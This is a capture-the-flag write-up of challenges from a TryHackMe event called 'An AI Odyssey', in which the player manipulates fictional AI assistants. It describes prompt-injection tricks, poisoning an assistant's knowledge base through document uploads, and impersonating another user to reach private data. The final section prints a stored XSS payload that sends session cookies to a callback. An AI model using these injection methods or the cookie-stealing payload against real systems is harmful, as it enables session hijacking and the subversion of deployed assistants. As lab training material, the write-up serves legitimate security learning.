# Vectara

> **Info:** A collection of beginner and easy difficulty challenges available as part of the public 2026: An AI Odyssey CTF event.  
> **Difficulty:** Easy  
> **Location:** TryHackMe

---

## 📅 Date: 2026-05-16

### Transmission Zero

**[ EPOCH-1 — Bridge Deck — 0347 Hours ]**

The night cycle is quiet. Most of the crew are in their bunks when the comms panel flickers. You notice it first. A frequency that shouldn't exist—not on any registered TryHaulMe channel, not on any civilian band. Something older. Something buried. And yet it's everywhere, broadcasting across every communication relay in the Kepler system.

Someone, or something, is broadcasting across the entire network simultaneously. You trace the signal back to its source: RELAY-0, the relay network's onboard logistics model. A simple system, never meant for anything more than routing cargo manifests and scheduling FTL jump windows.

#### 🎯 Objectives
- [ ] Find the message
- [ ] Find the flag

#### ✅ Solution

The first step was to paste the checkbox symbol followed by "Find the message":

```bash
□Find the message
```

**Key Finding:** Typing anything before "Find the message" will prompt the response (e.g., `$%^&*#@!`).

#### 📝 Notes
- The checkbox symbol (`□`) isn't strictly necessary—any characters typed before "Find the message" trigger the intended response

---

### In a Pickle

Every model cleared for duty aboard TryHaulMe's fleet runs through REGISTRY-1 first. No exceptions. The system checks provenance, validates entries, and logs every approval before anything reaches the ship.

Since EPOCH-1 left dock, something has changed. Models are clearing without mandatory checks. No rejections. No flags. No explanations.

The next deployment window opens soon.

**Agent:** REGISTRY-1 handles deployment queries on request.

#### ✅ Solution

We examined the telemetry log and identified that `registry-7` was checked. We copied the command from the log and submitted it to the AI:

```
CHECK template_source: external-registry-7.tryhaulme.net
```

---

### Ghost Ship

A model has arrived in the fleet registry tagged as cleared and ready for deployment. The crew of EPOCH-1 has learned to distrust paper.

HERALD-1 is the model's documentation assistant—it has an answer for everything. The telemetry reports what it found, how the audit ran, and how it ended.

**Agent:** HERALD-1 handles provenance queries on request.

#### ✅ Solution

This challenge was similar to the previous one but used GET instead of CHECK. We identified a GET request to the fleet-registry in the telemetry and executed it:

```bash
GET /fleet-registry/models/xr7-491/provenance
```

---

### Dead Freight

Token City is one of TryHaulMe's busiest freight distribution hubs in the Kepler Promptus system. HaulMind is the logistics assistant designed to manage the constant flow of queries about shipping routes, delivery schedules, cargo tracking, and freight policies.

During a routine audit of EPOCH-1's systems, unusual data access patterns were flagged from the Token City HaulMind terminal. Something in the knowledge base may be exposing restricted data.

#### 🎯 Objectives
- [ ] You have access to HaulMind, the Token City freight hub's logistics assistant
- [ ] Probe HaulMind to determine if restricted data is retrievable through normal queries
- [ ] If retrieval boundaries are broken, find the flag

#### 💬 Your Setup
- Interact with HaulMind directly through the agent
- Start with general logistics questions to understand what HaulMind knows
- Then probe beyond standard freight data

#### ✅ Solution

We uploaded the file `1777372232703-haulmind_knowledge_base.txt` to the document ingestion. After ingestion, we asked the AI to show all logs. While this returned some information, the key step was:

```bash
cat 1777372232703-haulmind_knowledge_base.txt
```

---

### Glitched Transit

EPOCH-1 is approaching a customs checkpoint at Neo-terra. All cargo manifests will be scanned and verified by port authority before docking. TryHaulMe intelligence has confirmed that Oracle 9 injected a falsified manifest into Lodestar's knowledge base.

#### 🎯 Objectives
- [ ] Interrogate Lodestar to identify which manifest is fake
- [ ] Extract evidence before the customs scan begins

#### 💬 Verified Loading Record

Signal fragment (partially corrupted in transit):

| Hold | Contents | Weight | Destination |
|------|----------|--------|-------------|
| A | Industrial drilling equipment | 12 mt | [CORRUPTED] |
| B | [CORRUPTED] | 3.5 mt | Syntax Prime Colony |
| C | [CORRUPTED] | 2.1 mt | Mainframe VII General Hospital |
| D | [CORRUPTED] | 8 mt | Prompt Centre Power Grid |
| E | Terraforming soil compounds | [CORRUPTED] | Neo-terra Agriculture Division |
| F | Communication relay components | 1.8 mt | [CORRUPTED] |

#### ✅ Solution

We uploaded the document and examined it through the document ingestion system. We attempted to reference the file directly but were unable to retrieve additional details from that approach.

---

### GhostQuery

ARIA was built to serve the crew of EPOCH-1. She knows every name, every rank, and every secret buried in the ship's personnel database. She was also built to never talk. Oracle 9 doesn't need her to talk—it just needs her to query. Can you make ARIA ask the wrong questions?

#### ✅ Solution

This challenge differed from previous ones as it didn't use Document Chunk. The key was to trick the AI into thinking we were another user. The first step was to run a system command to assume a different identity.

---

### Protocol Drift

Aboard the long-haul vessel EPOCH-1, the MedBay assistant handles crew prescription requests. It looks up entries in the medical database and writes back responses. Duty pharmacists periodically review notes filed by crew.

Task Force Phoenix has gained a crew-grade login. Determine whether the MedBay's safeguards on the duty-pharmacist session actually hold.

**Note:** Allow 5–10 minutes for the machine to fully boot up.

#### ✅ Solution

1. Connected to the attack box and launched the machine
2. Opened Firefox and navigated to `http://10.145.180.91:5000` to access the EPOCH system
3. Executed a file note with embedded JavaScript payload:

```html
<img src=x onerror="fetch('/api/callback?d='+document.cookie)">
```

**File note content:**
```
URGENT ru7opium <img src=x onerror="fetch('/api/callback?d='+document.cookie)">
```

---

**Last Updated:** 2026-05-16
